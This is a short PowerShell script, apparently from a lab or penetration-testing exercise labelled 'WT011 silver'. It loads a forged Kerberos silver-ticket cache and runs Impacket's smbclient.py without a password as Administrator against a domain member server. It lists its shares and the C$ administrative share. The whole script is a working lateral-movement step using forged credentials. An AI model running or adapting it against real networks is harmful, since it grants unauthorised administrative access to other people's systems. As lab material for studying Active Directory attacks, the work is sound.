# WT011 silver — smbclient.py with -inputfile command file
$ErrorActionPreference = 'Continue'
$out = 'C:\Tools\ADTools'
$smb = 'C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\smbclient.py'
$env:KRB5CCNAME = "$out\wt011-silver.ccache"

# Command file: default share list + c$ root
@('ls', 'use c$', 'ls') | Set-Content "$out\wt011-cmds.txt"

Write-Output '=== smbclient -k (silver ticket) ==='
python $smb -k -no-pass -inputfile "$out\wt011-cmds.txt" 'child.cadre.local/Administrator@mbr01.child.cadre.local' 2>&1 | Select-Object -First 30 | ForEach-Object { Write-Output "SMB|$_" }
Write-Output 'WT011_SMB4_DONE'
